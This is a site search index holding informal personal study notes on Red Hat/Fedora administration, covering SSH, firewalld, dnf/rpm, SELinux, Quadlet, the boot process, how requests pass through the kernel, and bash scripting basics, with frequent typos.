to allow or disallow root login.</li> <li><code>MaxAuthTriesSpecifies</code> the maximum number of authentication tries. Afterreaching half of this number, failures are logged to syslog.</li> <li><code>MaxSessionsIndicates</code> the maximum number of sessions that can be open fromone IP address.</li> <li><code>AllowUsersSpecifies</code> a space-separated list of users who are allowed to connectto the server.</li> <li><code>PasswordAuthenticationSpecifies</code> whether to allow password authentication. This option ison by default.</li> <li><code>TCPKeepAliveSpecifies</code> whether or not to clean up inactive TCP connections.</li> <li><code>ClientAliveIntervalSpecifies</code> the interval, in seconds, that packets are sent to the client to figure out if the client is still alive.</li> <li><code>ClientAliveCountMaxSpecifies</code> the number of client alive packets that need to be sent.</li> <li><code>UseDNSIf</code> on, uses DNS name lookup to match incoming IP addresses to names.</li> <li><code>ServerAliveIntervalSpecifies</code> the interval, in seconds, at which a client sends a packet to</li> <li><code>ServerAliveCountMaxSpecifies</code> the maximum number of packets a client sends to a server</li> </ul>"},{"location":"docs/protocols/ssh/#caching-the-ssh-passphrases","title":"Caching the ssh passphrases","text":"<ol> <li>Type ssh-agent /bin/bash to start the agent for the current (Bash) shell.</li> <li>Type ssh-add to add the passphrase for the current user\u2019s private key. The key is now cached.</li> <li>Connect to the remote server. Notice that there is no longer a need to enter the passphrase.</li> </ol>"},{"location":"docs/protocols/syslog_protocol/","title":"syslog protocol","text":""},{"location":"docs/protocols/syslog_protocol/#standard-for-message-loging","title":"Standard for message loging","text":"<ul> <li>Diverse systems,consolidated log</li> <li>UDP /514<ul> <li>Usualy a ==central log colection==</li> <li>intergrated wit the SEIM (securitie log manger) &gt;[!bug]     You need a lot of disk space &gt;Data storage from many devices     over an extended timeframe</li> </ul> </li> </ul> <p>SysLog</p>"},{"location":"docs/protocols/telnet/","title":"telnet","text":""},{"location":"docs/protocols/telnet/#telnet","title":"Telnet","text":"<p>==Telecomunication network== Port tcp/23 - Login to devices remotly (console acces) - Acesseing it via terminal</p> <p>[!bug] IT has In-the-clear communcation Theres no encryption !!! Not good for production systems</p> <p>[!example]- </p> <p>[!quote] ports ssh</p>"},{"location":"docs/redhat/autofs/","title":"Autofs","text":"<ul> <li> <p>We have the <code>/etc/auto.master</code> to configure mountpoints</p> <ul> <li>if u forget just use <code>rmp -qc  autofs</code> <ul> <li>Remember about installing <code>nfs-utils</code></li> </ul> </li> </ul> </li> <li> <p>Give the location of the mountpoint and the confiugration file associtated with it </p> <p>Example <code>/etc/auto.master</code> <pre><code>/mount/net /etc/auto.master.d/netdir.autofs\n</code></pre></p> </li> <li>Then create netir autofs  <pre><code>shared  -fstype=nfs,rw,hard ftp.example.org:/shared\n</code></pre></li> </ul>"},{"location":"docs/redhat/autofs/#options","title":"Options","text":"<p>DOCS  <pre><code>man 5 nfs \n</code></pre> <code>intr</code> (Interruptible) \u2192 Allows the NFS request to be interrupted if the server is unresponsive. DEPRECATED <code>soft</code>  \u2192 when  the NFS server becomes unresponsive, the client will timeout instead of hanging indefinitely <code>hard</code>\u2192   Prevents file corruption by ensuring retries instead of timeout failures.</p> <ol> <li>If ur'e using systemd mounts remember about <code>network-online</code> target</li> </ol> <p>Mount the user Netuser on <code>/netuser</code> <pre><code>\n</code></pre></p> <ol> <li>Then </li> </ol>"},{"location":"docs/redhat/boot_process/","title":"Boot Process","text":"<p>UEFI vs BIOS</p> <p></p>"},{"location":"docs/redhat/boot_process/#hardware-sources","title":"Hardware sources","text":"<ul> <li>PXE (pre-boot execution environment)<ul> <li>install operating system online</li> </ul> </li> <li>iPXE(uses HTTPS)</li> </ul>"},{"location":"docs/redhat/boot_process/#see-the-init-boot-procsse-right-from-grub","title":"See the init boot procsse right from grub","text":"<pre><code>cat /proc/cmdline\n</code></pre> <pre><code>dmesg | head \n</code></pre> <p>Grub 2</p>"},{"location":"docs/redhat/boot_process/#steps","title":"Steps","text":"<ul> <li> <p><code>POST</code>(power on self)</p> <ul> <li>Turning On for the system firemwer </li> </ul> </li> <li> <p><code>Selecting Bootable device</code></p> <ul> <li>Either From UEFI or for the bios </li> </ul> </li> <li> <p><code>Loding the boot loader</code> (Grub or Grub2)</p> </li> <li> <p>Loading the Kernel</p> </li> <li> <p>Loading  <code>initramfs</code> </p> <ul> <li>On Rehl it also contains the complate OS</li> </ul> </li> <li> <p><code>Starting /sbin/init</code></p> <ul> <li>And loading systemd-udev daemon</li> </ul> </li> <li> <p><code>Process initrd.target</code>(ececute all units to create minimal env)</p> <ul> <li>mounting root file system on  <code>/sysroot</code></li> </ul> </li> <li> <p><code>Switch to rootfs</code></p> <ul> <li>Runing the default target afterwards</li> </ul> </li> </ul>"},{"location":"docs/redhat/boot_process/#changing-the-root-password","title":"Changing  the root password","text":"<ol> <li>Enter the rescue mode </li> <li>Add this line before <code>intird</code> <pre><code>init=/bin/bash \n</code></pre></li> <li>Then boot </li> <li>Mount the system in rw perrmison  to be able to applay changes  <pre><code>mount -o remount,rw /\n# And then back to readonly \nmount -o remount,ro /\n</code></pre> Rembert to <code>.autorelabel</code> for SELinux</li> <li>reboot the system </li> </ol>"},{"location":"docs/redhat/boot_process/#exec-sbininit-6-or-exec-usrlibsystemdsystemd","title":"<pre><code>exec /sbin/init 6\n# or \nexec /usr/lib/systemd/systemd\n</code></pre>","text":"<p>restet root pass init</p>"},{"location":"docs/redhat/firewalld/","title":"Firewalld","text":""},{"location":"docs/redhat/firewalld/#default-zones","title":"Default zones","text":"Zone Description block Incoming network connections are rejected with an <code>icmp-host-prohibited</code> message. Only network connections initiated on this system are allowed. dmz For use on computers in the demilitarized zone. Only selected incoming connections are accepted, and limited access to the internal network is allowed. drop Any incoming packets are dropped, and there is no reply. external For use on external networks with masquerading (Network Address Translation [NAT]) enabled, used especially on routers. Only selected incoming connections are accepted. home For use with home networks. Most computers on the same network are trusted, and only selected incoming connections are accepted. internal For use in internal networks. Most computers on the same network are trusted, and only selected incoming connections are accepted. public For use in public areas. Other computers on the same network are not trusted, and limited connections are accepted. This is the default zone for all newly created network interfaces. trusted All network connections are accepted. work For use in work areas. Most computers on the same network are trusted, and only selected incoming connections are accepted."},{"location":"docs/redhat/firewalld/#get-the-state","title":"Get the state","text":"<pre><code> firewall-cmd --list-all \n # Output:\n #  FedoraWorkstation (default, active)\n #  target: default\n #  ingress-priority: 0\n #  egress-priority: 0\n #  icmp-block-inversion: no\n #  interfaces: wlp0s20f3\n #  sources:\n #  services: dhcpv6-client mdns samba-client ssh\n #  ports: 1025-65535/udp 1025-65535/tcp\n #  protocols:\n #  forward: yes\n #  masquerade: no\n #  forward-ports:\n #  source-ports:\n #  icmp-blocks:\n #  rich rules:\n</code></pre>"},{"location":"docs/redhat/firewalld/#servcies","title":"Servcies","text":"<ul> <li>The services are xml files<ul> <li><code>/usr/lib/firewalld/services/</code> defulat services</li> <li><code>/etc/firewalld/services/</code> user  services <p>List  all services <pre><code> firewall-cmd --get-services | perl -pe 's, ,\\n,g'\n # Output:\n # wsdd-http\n # wsman\n # xdmcp\n # zero-k\n</code></pre> Get details on the service <pre><code>firewall-cmd  --info-service=zero-k\n# Output \n# zero-k\n#   ports: 8452/udp\n#   protocols:\n#   source-ports:\n#   modules:\n#   destination:\n#   includes:\n#   helpers:\n# \n</code></pre></p> </li> </ul> </li> <li>Firewalld services define firewall rules, including:<ul> <li>Which ports to open (TCP/UDP).</li> <li>Which kernel modules to load.</li> <li>What traffic should be accepted or rejected.</li> </ul> </li> </ul>"},{"location":"docs/redhat/httpd/","title":"Guide on installaing and configuring apache server","text":"<ul> <li> <p>Check for the group <code>Basic Web Server</code> <pre><code>dnf grouplist --hiden \n</code></pre></p> </li> <li> <p>Check with what the httpd was compiled (to get the conf file) <pre><code>http -V \n</code></pre></p> </li> </ul>"},{"location":"docs/redhat/interfaces_naming/","title":"Interfaces Naming","text":"<ul> <li>Network names types</li> <li><code>en</code>  Ethernet interfaces begin with , </li> <li><code>wl</code> WLAN</li> <li><code>wa</code> WAN</li> <li> <p>Adapter naming</p> <ul> <li><code>o</code> onboard(build into the motherboard)</li> <li><code>s</code> hotplug slot </li> <li><code>p</code> PCI device </li> <li><code>x</code> used to create the devie name based on the MAC adress</li> </ul> </li> <li> <p>Then follows a number, which is used to represent an index, ID, or port.</p> </li> <li> <p>Exeptions Apart from this default device naming, network cards can be named based on the BIOS device name as well. In this naming scheme, names such as <code>em1</code> (embedded network card 1) or <code>p4p1</code> (which is PCI slot 4, port 1) can be used.</p> </li> </ul>"},{"location":"docs/redhat/logger/","title":"Logger","text":""},{"location":"docs/redhat/logger/#a-tool-for-checking-the-is-logging-working","title":"A tool  for checking the is logging working","text":"<p>Write a log message to the systemd   level debug</p> <pre><code>logger -p daemon.debug \"this message from Task6\" \n</code></pre>"},{"location":"docs/redhat/mount/","title":"mount","text":"<ul> <li><code>nodev</code> u can only have files on the system no special devices like disks   or block devices</li> <li><code>nosuid</code> can't elevate privileges for processes</li> </ul> <pre><code># Example of secure mounting\nsudo mount -o ro,nosuid,nodev,noexec,nofail /dev/sdb1 /mnt/usb_secure\n</code></pre>"},{"location":"docs/redhat/nmcli/","title":"Nmcli","text":"<p>Verfie the current permiton on the network use  <pre><code>nmcli general perrmison\n# Output: \n# PERMISSION                                                        VALUE\n# org.freedesktop.NetworkManager.checkpoint-rollback                auth\n# org.freedesktop.NetworkManager.enable-disable-connectivity-check  yes\n# org.freedesktop.NetworkManager.enable-disable-network             yes\n# org.freedesktop.NetworkManager.enable-disable-statistics          yes\n# org.freedesktop.NetworkManager.enable-disable-wifi                yes\n# org.freedesktop.NetworkManager.enable-disable-wimax               yes\n# org.freedesktop.NetworkManager.enable-disable-wwan                yes\n# org.freedesktop.NetworkManager.network-control                    yes\n# org.freedesktop.NetworkManager.reload                             auth\n# org.freedesktop.NetworkManager.settings.modify.global-dns         auth\n# org.freedesktop.NetworkManager.settings.modify.hostname           auth\n# org.freedesktop.NetworkManager.settings.modify.own                yes\n# org.freedesktop.NetworkManager.settings.modify.system             yes\n# org.freedesktop.NetworkManager.sleep-wake                         no\n# org.freedesktop.NetworkManager.wifi.scan                          yes\n# org.freedesktop.NetworkManager.wifi.share.open                    yes\n# org.freedesktop.NetworkManager.wifi.share.protected               yes\n</code></pre></p>"},{"location":"docs/redhat/nmcli/#netowrking-scripts","title":"Netowrking  scripts","text":"<ul> <li>There are located in  <code>/etc/NetworkManager/system-connections/</code></li> <li>On the legacy system there were stored in <code>/etc/sysconfig/network-scripts</code></li> </ul> <p>Modyfing the connection  <pre><code> nmcli connection modify eth0  ipv4.addresses 172.24.0.110/24 ipv4.gateway 172.24.0.254 ipv4.dns 172.24.0.254 ipv4.method manual\n</code></pre></p>"},{"location":"docs/redhat/pkg_managment/","title":"dnf","text":""},{"location":"docs/redhat/pkg_managment/#common-update-flags","title":"Common Update Flags","text":"<ul> <li><code>--best</code></li> <li><code>-\u2010security</code></li> <li><code>\u2010\u2010enhancement</code></li> <li><code>\u2010\u2010bugfix</code></li> </ul> <p>To list updates and their severity levels</p> <p>Article</p>"},{"location":"docs/redhat/pkg_managment/#check-for-seciurity-update","title":"Check for seciurity update","text":"<pre><code> dnf check-update --security\n</code></pre>"},{"location":"docs/redhat/pkg_managment/#install-only-seciure-updates-and-bugfixes","title":"Install only seciure updates and bugfixes","text":"<pre><code> dnf update --security --bugfix\n</code></pre>"},{"location":"docs/redhat/pkg_managment/#install-only-the-specyifc-set","title":"Install only the specyifc set","text":"<pre><code>dnf update --advisory: FEDORA-2021-74ebf2f06f\n</code></pre>"},{"location":"docs/redhat/pkg_managment/#kernel-updates","title":"Kernel Updates","text":"<p><pre><code># Check for the new kernel\n# This will also list kernels that are already on the system\n# The kernels are located in /boot/vmlinuz*\n# Always check if they are symlinks or not!!!  \ndnf list kernel \n# Output: \n# Installed packages\n# kernel.x86_64 6.11.10-300.fc41 updates\n# kernel.x86_64 6.12.9-200.fc41  updates\n# kernel.x86_64 6.12.15-200.fc41 updates\n# \n# Available packages\n# kernel.x86_64 6.13.6-200.fc41  updates\n\n# Install the new version of kernel \ndnf install kernel --best \n</code></pre> <pre><code> dnf updateinfo list --security\n</code></pre></p>"},{"location":"docs/redhat/pkg_managment/#menaging-repos","title":"Menaging repos","text":"<p>The repos are stored  in <code>/etc/yum.repos.d</code></p> <pre><code># modifying the repoo\n# Old way \ndnf config-manger --enable &lt;repo_id&gt;\ndnf config-manger --disable &lt;repo_id&gt;\n# New way \ndnf config-manager setopt repo-id.enabled=0\ndnf config-manager setopt repo-id.name=new-repo-name\n</code></pre> <p>Outdated Redhat way <pre><code># Add the repo\n# Outdated\ndnf config-manager --add-repo=http://reposerver.example.com/\n</code></pre></p> <ul> <li> <p>By defualt it uses the HTTP prtoocol but u can specyfie the diffrent one</p> <ul> <li><code>protocol://,</code> such as <code>http://,</code> <code>ftp://,</code> or <code>file://.</code> </li> </ul> </li> <li> <p>If the packagekit deamon is enabled List the removed packages journalctl -u packagekit | grep -i removed-package</p> </li> </ul>"},{"location":"docs/redhat/pkg_managment/#rpm","title":"rpm","text":"<p><code>Important to not install packages using rpm direcly use</code> <code>rpm -Uvh</code>  wont update the dnf package database</p> <p>Rocky Linux Repositories</p>"},{"location":"docs/redhat/pkg_managment/#when-the-pacage-was-insatlled-last","title":"When the pacage was insatlled <code>--last</code>","text":"<pre><code>rpm -qa  --last\n</code></pre>"},{"location":"docs/redhat/pkg_managment/#general-info-qi","title":"General info <code>-qi</code>","text":"<pre><code>rpm -qi openssl\n</code></pre>"},{"location":"docs/redhat/pkg_managment/#pacage-dependecies-r","title":"Pacage Dependecies <code>-R</code>","text":"<pre><code>rpm -qR openssl\n</code></pre>"},{"location":"docs/redhat/pkg_managment/#reading-a-package-changelog-changelog","title":"Reading a package changelog <code>--changelog</code>","text":"<pre><code>rpm -q --changelog  openssl\n</code></pre>"},{"location":"docs/redhat/pkg_managment/#files-provided-by-the-pacage-l","title":"Files provided by the pacage <code>-l</code>","text":"<pre><code>rpm -ql openssl\n</code></pre>"},{"location":"docs/redhat/pkg_managment/#get-the-configuration-files-that-the-package-uses","title":"Get the configuration files that the package uses","text":"<pre><code>rmp -qc nmap \n</code></pre>"},{"location":"docs/redhat/pkg_managment/#get-the-installation-scripts","title":"Get the installation scripts","text":"<ul> <li><code>-p</code> to see package  before the installation  <pre><code>rmp -q --scritps\n</code></pre></li> </ul>"},{"location":"docs/redhat/pkg_managment/#list-the-avaialble-documentaitions","title":"List the avaialble documentaitions","text":"<pre><code>rpm -qd dnsmas\n</code></pre>"},{"location":"docs/redhat/pkg_managment/#check-installed-kernels","title":"Check installed kernels","text":"<pre><code># The kernels are located in /boot/vmlinuz*\n# Always check if they are symlinks or not!!!  \nrpm -qa kernel\n# Output: \n# kernel-6.11.10-300.fc41.x86_64\n# kernel-6.12.9-200.fc41.x86_64\n# kernel-6.12.15-200.fc41.x86_64\n</code></pre>"},{"location":"docs/redhat/quadlet/","title":"Quadlet","text":"<p>Docs are avaialbe at <code>man quadlet</code> * U can use systemd service as a contianers      * Thery are stored <code>~/.config/containers/systemd/</code> as <code>.conatainer</code> files         * When u add them add them as  a service not as a container file </p> <p><code>Important Notice</code> </p> <p>If  u ever want to enable continer as a service u have to be logged as tty su is insuficitent</p> <p>Check weather the systemd sees the <code>.container</code> files <pre><code>/usr/lib/systemd/system-generators/podman-system-generator --user --dryrun\n\n# Output\n# quadlet-generator[57009]: Loading source unit file /home/aura/.config/containers/systemd/mycontainer.container\n# ---mycontainer.service---\n</code></pre></p> <p>Syntax Docs *  Also works with the Kubernetes yaml</p> <p>Create  app.kube  file <pre><code>[Kube]\nyaml=fedora.yml\n</code></pre> REMBER to check does the user linger with <code>loginctl</code> ```bash loginctl show-user aura</p>"},{"location":"docs/redhat/quadlet/#output","title":"Output:","text":""},{"location":"docs/redhat/quadlet/#uid1000","title":"UID=1000","text":""},{"location":"docs/redhat/quadlet/#gid1000","title":"GID=1000","text":""},{"location":"docs/redhat/quadlet/#nameaura","title":"Name=aura","text":""},{"location":"docs/redhat/quadlet/#timestampthu-2025-02-20-185131-cet","title":"Timestamp=Thu 2025-02-20 18:51:31 CET","text":""},{"location":"docs/redhat/quadlet/#timestampmonotonic23674016","title":"TimestampMonotonic=23674016","text":""},{"location":"docs/redhat/quadlet/#runtimepathrunuser1000","title":"RuntimePath=/run/user/1000","text":""},{"location":"docs/redhat/quadlet/#serviceuser1000service","title":"Service=user@1000.service","text":""},{"location":"docs/redhat/quadlet/#sliceuser-1000slice","title":"Slice=user-1000.slice","text":""},{"location":"docs/redhat/quadlet/#display2","title":"Display=2","text":""},{"location":"docs/redhat/quadlet/#stateactive","title":"State=active","text":""},{"location":"docs/redhat/quadlet/#sessions3-2","title":"Sessions=3 2","text":""},{"location":"docs/redhat/quadlet/#idlehintno","title":"IdleHint=no","text":""},{"location":"docs/redhat/quadlet/#idlesincehint0","title":"IdleSinceHint=0","text":""},{"location":"docs/redhat/quadlet/#idlesincehintmonotonic0","title":"IdleSinceHintMonotonic=0","text":""},{"location":"docs/redhat/quadlet/#lingerno","title":"Linger=no","text":"<p>loginctl enable-linger ``</p> <p>podman</p>"},{"location":"docs/redhat/selinux_containers/","title":"Selinux containers","text":"<p>The Docker SELinux security policy is similar to the libvirt security policy</p> <ul> <li>Docker launches each container with a unique process SELinux label     <code>container_t</code></li> <li>Labels all of the container content with a single label     <code>container_file_t</code></li> </ul> <p>Docs</p> <p>This doesn\u2019t work with volumes!!!</p> <p>Explanation</p> <p>To label the file as a volume u have to change it context with <code>container_file_t</code></p> <pre><code>sudo chcon -t container_file_t /path/to/file\n</code></pre> <p>Or if it\u2019s the directort then add the mark <code>:Z</code> at the and of the volume - <code>-Z</code> only one contianer can acess to the volume - <code>-z</code> multiple containers can access the volume</p> <pre><code>volumes: \n- \".config/loki/local-config.yaml:/etc/loki/local-config.yaml:Z\"  \n</code></pre>","tags":["selinux"]},{"location":"docs/redhat/selinux_containers/#docker-access","title":"Docker Access","text":"<p>Docker has access to - /usr/var/ - /var/lib/docker - /var/lib/containers - most things in /etc.</p> <p>Tip</p> <p>Containers can read everything labled <code>svirt_sandbox_file_t</code></p> <p>Docs</p>","tags":["selinux"]},{"location":"docs/redhat/selinux_containers/#udica","title":"Udica","text":"<p>Docs TODO!</p> <p>[Selinux MAIN]({{\\&lt; ref \u201cposts/SELinux.md\u201d&gt;}}) [Selinux Containers]({{\\&lt; ref \u201cposts/redhat/selinux_containers.md\u201d&gt;}})</p>","tags":["selinux"]},{"location":"docs/redhat/selinux_policies/","title":"Selinux policies","text":"<p>When system starts the policies are loaded into memory</p> <p>Disclaimer</p> <p>Don\u2019t write your own policies for the apps.</p> <p>Use Containers!</p> <p>If they fail, use a tool like udica to label them.</p> <p>If you absolutely have to, then clone context from the existing app, like Nginx.</p> <p>Guide to write a policy</p> <p>List modules</p> <pre><code>semodule -l \n</code></pre>","tags":["selinux"]},{"location":"docs/redhat/selinux_policies/#semanage","title":"Semanage","text":"<p>listing the predefained policies</p> <pre><code>semange port  -l \n</code></pre>","tags":["selinux"]},{"location":"docs/redhat/selinux_policies/#changing-the-context","title":"Changing the context","text":"<ol> <li>first tell selinux what should be the defult value</li> <li>*Then change it with restorecon**</li> </ol>","tags":["selinux"]},{"location":"docs/redhat/selinux_policies/#not-standard-ports","title":"Not standard ports","text":"<p>Sel has policies for the standard port</p> <p>To change the policy to something different</p> <p>range can be specyfied via -</p> <pre><code>semange -a -t  http_port_t -p tcp 444-333\n</code></pre> <ul> <li><code>-m</code>is to modyfie already existing policy</li> <li><code>-d</code> to delete</li> <li><code>-t</code> type</li> <li><code>-a</code> add</li> </ul> <p>U can check for only your customization wiht -<code>lC</code></p> <pre><code>$ semanage port -lC\n\n-------------------------------------------------------\nSELinux Port Type              Proto    Port Number\n\ngrafana_port_t                 tcp      3000\n[root@localhost Notes]# [\n</code></pre>","tags":["selinux"]},{"location":"docs/redhat/selinux_policies/#permissive-policies","title":"Permissive policies","text":"<pre><code>semange permissive -l\n</code></pre>","tags":["selinux"]},{"location":"docs/redhat/selinux_policies/#booleans","title":"Booleans","text":"<p>It\u2019s when u have to enable a option in the policy thats prevented by default Docks</p> <ul> <li>Set the boolen yourself</li> </ul> <pre><code>sudo semanage boolean -m -on http_allow_homedirs\n</code></pre> <ul> <li>Check boolens set by users</li> </ul> <pre><code>semanage boolean -l -C\n</code></pre> <p>List of set boolens by user is stored in (old verisons)</p> <p>/etc/selinux/targeted/modules/activeactive</p> <p>Tip</p> <p>Install setroubleshoot-server to deal with the message</p> <p>[Selinux MAIN]({{\\&lt; ref \u201cposts/SELinux.md\u201d&gt;}}) [Selinux Containers]({{\\&lt; ref \u201cposts/redhat/selinux_containers.md\u201d&gt;}})</p>","tags":["selinux"]},{"location":"docs/redhat/stratis/","title":"Stratis","text":"<p>Storage management solution developed by Red Hat</p>"},{"location":"docs/redhat/stratis/#-can-create-snapshots-similar-to-btrtfs-but-for-xfc","title":"- Can create snapshots (similar to <code>btrtfs</code> but for <code>xfc</code>)","text":""},{"location":"docs/redhat/systemd-udev/","title":"Systemd-Udev","text":"<p>It detects the hardwere and loads approriate drivers or execute a user defined behavior (ex. auto usb mounts)</p> <ul> <li>The rules are stored in <code>/usr/lib/udev/rules.d</code></li> <li>The custom rules are defined in <code>/etc/udev/rules.d.</code></li> <li>Then the hardwer gets registered to the  <code>/sys</code> dir</li> </ul>"},{"location":"docs/redhat/systemd-udev/#probing-the-hardwere","title":"Probing the hardwere","text":"<p>See how the system probes particular hardwer  <pre><code>udevadm monitor\n# Output:\n# UDEV - the event which udev sends out after rule processing\n# KERNEL - the kernel uevent\n# KERNEL[132406.831270] add\n# /devices/pci0000:00/0000:00:11.0/0000:02:04.0/usb1/1-1 (usb)\n# KERNEL[132406.974110] add\n# /devices/pci0000:00/0000:00:11.0/0000:02:04.0/usb1/1-1/1-1:1.0 (usb)\n# UDEV [132406.988182] add\n# /devices/pci0000:00/0000:00:11.0/0000:02:04.0/usb1/1-1 (usb)\n# KERNEL[132406.999249] add /module/usb_storage (module)\n# UDEV [132407.001203] add /module/usb_storage (module)\n</code></pre></p>"},{"location":"docs/redhat/systemd-udev/#alernative-to-loading-modules","title":"Alernative to loading modules","text":"<p>By creating a file  in <code>/etc/modules-load.d</code></p> <ul> <li>The one that are already loaded are in the <code>/usr/lib/modules-load.d.</code></li> </ul>"},{"location":"docs/redhat/tty/","title":"Tty","text":"<p>Basicly any device that can  take the input form the  keyboard</p>"},{"location":"docs/redhat/tuned/","title":"Tuned","text":""},{"location":"docs/redhat/tuned/#the-dynamic-system-tuning-daemon","title":"The Dynamic System Tuning Daemon","text":"<p>Designed to dynamically adjust system settings to optimize performance and power usage for specific workloads. It is part of the tuned package and is often used in enterprise distributions like Fedora, Rocky Linux, and RHEL.</p> <p>Check the current  Profile <pre><code>tuned-adm active\n# Output:\n# balanced\n</code></pre></p> <p>Check the recomended profile <pre><code>tuned-adm recommended\n# Output:\n# balanced\n</code></pre></p>"},{"location":"docs/redhat/tuned/#common-tuning-profiles","title":"Common Tuning Profiles","text":"<ul> <li><code>balanced</code>: A general-purpose profile that balances performance and power consumption.</li> <li><code>performance</code>: Maximizes system performance.</li> <li><code>powersave</code>: Reduces power consumption, often at the cost of performance.</li> <li><code>virtual-guest:</code> Optimizes the system for running as a virtual machine guest.</li> <li><code>virtual-host:</code> Optimizes the system for hosting virtual machines.</li> </ul>"},{"location":"docs/redhat/umount/","title":"Umount","text":"<p>Find the open files asociated with drive</p> <pre><code>lsof +f -- /dev/sda3\n</code></pre> <p>Forcefully Unmounting a Device: </p> <p>The '-l' option will perform a lazy unmount, detaching the drive immediately but cleaning up references when the drive is no longer bus ```bash  sudo umount -l drive_name</p>"},{"location":"docs/request_journey/accept_queue/","title":"Accept queue","text":"<p>Use is in handeling the request</p> <p>It holds full fladget connations that has been aceepted - Size of the queue is determine by backend baclog</p>"},{"location":"docs/request_journey/accept_queue/#too-many-connection-problem","title":"Too many connection problem","text":"<p>U can have 2 threads listing on the same port (u have to flag it)</p> <p>Request_journey_kernel</p> <p>[Sync Queue]({{\\&lt; ref \u201cposts/request_journey/request_journey_kernel.md\u201d&gt;}})</p>"},{"location":"docs/request_journey/recive_queue/","title":"alt-name Recieve Buffer ## Recive queue As data arrives from the","text":"<p>client, it is placed into the receive queue by the operating system or network stack, ready for the backend application to retrieve using the recv() systemcall .</p> <p>send_queue</p>"},{"location":"docs/request_journey/request_journey_backend/","title":"request journey backend","text":""},{"location":"docs/request_journey/request_journey_backend/#read","title":"Read","text":"<ul> <li>Once the connection is added to the accept     queue, the     system call accept is used to pop it     from the queue and return a file descriptor representing the     connection (now the backend has a pointer to the connection).</li> <li>The backend then uses the system call recv.</li> <li>Another system call read is used.<ul> <li>We copy the data to the [[system application layer]].<ul> <li>This data is encrypted raw bytes.</li> <li>==We do not know yet whether it\u2019s a request.==</li> <li>We must also account for read time, as the receive     queue has a     limited size.</li> </ul> </li> </ul> </li> </ul> <p>1</p>"},{"location":"docs/request_journey/request_journey_backend/#decrypt","title":"Decrypt","text":"<p>Since I performed the TLS session earlier, I can get the symmetric key and exchange it with the client. - This is partially handled by the TMP. - The packet is then copied (check for decryption in place) and decrypted.</p>"},{"location":"docs/request_journey/request_journey_backend/#parsing","title":"Parsing","text":"<p>We determine the protocol and begin parsing accordingly. - Issues: - It may be that we do not see the full request it does not fit the bandwith. - In this case, you have to wait for the request to be fully received.</p>"},{"location":"docs/request_journey/request_journey_backend/#decoding","title":"Decoding","text":"<ul> <li>Determine the type of encoding used in the message (e.g., ASCII or     UTF-8) based on the backend\u2019s language.<ul> <li>Decompress compressed parts of the request.</li> <li>Deserialization happens here.</li> </ul> </li> </ul>"},{"location":"docs/request_journey/request_journey_backend/#process","title":"Process","text":"<p>We fire the event, the callback occurs, and we process the request.</p> <p>request_journey_kernel</p>"},{"location":"docs/request_journey/request_journey_kernel/","title":"request journey kernel","text":""},{"location":"docs/request_journey/request_journey_kernel/#request","title":"Request","text":"<p>It\u2019s a stream of bytes that has its particular sections defined (body, request itself) via a certain protocol Tcp and then parsed into the particular programming language. (You can define your own protocol.)</p>"},{"location":"docs/request_journey/request_journey_kernel/#request-journey","title":"Request Journey","text":"<p>[!example]- </p> <p>Accept - Before we send a request, we need to establish a transport mechanism, which in this case is a TCP connection (SYN/SYN-ACK). - While listening on a specific port, the Kernel will create two queue algorithms for a listener: a socket object, which is a file associated with the port. - Sync queue - Accept queue - The packet travels from the NIC physical to the Kernel memory via a process called DMA (Direct Memory Access). - The Kernel checks whether it has a socket for this particular port. - If it doesn\u2019t, it drops the connection and replies with an ICMP message (Destination Unreachable). - If it does, it puts the SYN into the sync queue. -  - Then the Kernel replies to the client with a SYN-ACK to complete the connection. - Once the server receives the SYN-ACK, it moves the connection to the accept queue. -  - Now that the connection is in the accept queue, the backend has to manage it. - The Kernel creates two additional queues: - Receive queue - Send queue</p> <p>request_journey_backend</p>"},{"location":"docs/request_journey/request_journey_kernel/#static-files","title":"Static Files","text":"<p>Before sending the file over the network, you have to read the file to disk. The system call is blocking the request (synchronous process).</p> <ul> <li>You have to write the headers, such as (Content-Length).</li> <li>This is where Doctype HTML comes in.<ul> <li>This operation is asynchronous.</li> </ul> </li> </ul> <p>web sockets</p>"},{"location":"docs/scriptss/Arguments/","title":"Arguments in Bash","text":"<p>U can give arguments by n*umber*\u2005*\u2005\u2005*\u2005\u2005\u2212\u2005\u2005*\u2005*# it chechs weather the particular number of arguments where inserted &gt;Example &gt;</p>"},{"location":"docs/scriptss/At/","title":"At","text":"<pre><code>at **time** -f path/to/file *./*myscript\n</code></pre> <p>atq - what jobs are cheduled</p> <p>atr(number of the job) - remove the job</p> <p>Cronetab | Scheduling Scripts</p>"},{"location":"docs/scriptss/Case_statment_bash/","title":"Case statments in Bash","text":"<p>It allows to have multiple options Fucntios wirthut writing if</p> <p>Example  (* ) means else remeber about ;; at the end of the line exept the last one</p>"},{"location":"docs/scriptss/Cronetab/","title":"Cronetab","text":""},{"location":"docs/scriptss/Cronetab/#cronetab-e","title":"cronetab -e","text":"<p>U can run separate jobs as diffrent users - If u got sudo u can edit others cronetabs with sudo cronetab -u username ### cronejob Crone jobs are cheduled in military time { * } if u dont care about the filed &gt;[!example] &gt;</p> <p>Practise ### Crone shortcuts This are located in /etc/cron.(daily,weekly) U put there executable scripts  ### Crone globaly &gt;[!bug] Don\u2019t ever change the global config Add the cronjob as a separate file in /etc/cron.d ### Boot rc scripts</p> <p>Scheduling Scripts</p>"},{"location":"docs/scriptss/Data_Streams/","title":"Data Streams","text":""},{"location":"docs/scriptss/Data_Streams/#data-streams","title":"Data Streams","text":""},{"location":"docs/scriptss/For_loop/","title":"C sytle loops","text":"<pre><code>for ((i: 0; i&lt;=100;i++));do echo \"im counting $i\"; done\n</code></pre>"},{"location":"docs/scriptss/For_loop/#for-loop","title":"for loop","text":"<pre><code>for i in files /* .log\ndo\n    tar -czvf $file.tar.gz $file\ndone\n</code></pre>"},{"location":"docs/scriptss/Functions/","title":"Functions","text":""},{"location":"docs/scriptss/Functions/#importing","title":"Importing","text":"<p>To import an function u have to source the file that conteisn the function &gt;[!example] &gt; Method 1: using the source command source /path/to/my_functions.sh my_function &gt;Method 2: using the . operator &gt;. /path/to/my_functions.sh &gt;my_function</p>"},{"location":"docs/scriptss/Functions/#functions_1","title":"Functions","text":"<p>[!example] check_exit_status(){ function }</p>"},{"location":"docs/scriptss/Functions/#if-statment","title":"IF statment","text":"<p>[] - Test commad &gt;[!example]- &gt;mynu: 300 if [ $mynu -eq 200 ] then echo \u201cThe condition is true\u201d else echo xd fi</p> flag function ! reverse the statment -eq equal to -ne not equal to -gt greater then -f does file exist -d does dir exist 2pipes or if one condtion is ture &amp;&amp; and if both conditions are true : Returns 0 or true . executes a shell script bg Puts a 